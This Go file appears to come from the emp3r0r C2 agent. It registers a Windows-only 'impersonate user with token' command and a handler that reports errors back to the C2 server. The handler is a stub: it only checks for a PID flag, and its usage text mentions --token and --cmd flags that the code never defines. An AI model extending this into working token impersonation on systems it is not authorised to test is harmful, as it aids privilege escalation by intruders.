//go:build windows

package handler

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/spf13/cobra"
)

func platformCommands(cmd *cobra.Command) {
	// !impersonate
	impersonateCmd := &cobra.Command{
		Use:     def.C2CmdImpersonate,
		Short:   "Impersonate user with token",
		Example: fmt.Sprintf("%s --token <token> --cmd <command>", def.C2CmdImpersonate),
		GroupID: "windows",
		Run:     runImpersonate,
	}
	cmd.Flags().StringP("pid", "", "", "PID of the process to impersonate")
	cmd.AddCommand(impersonateCmd)
}

func runImpersonate(cmd *cobra.Command, args []string) {
	pid, _ := cmd.Flags().GetString("pid")
	if pid == "" {
		c2transport.NotifyC2(cmd, "Error: args error: PID is required: %s", args)
		return
	}
}
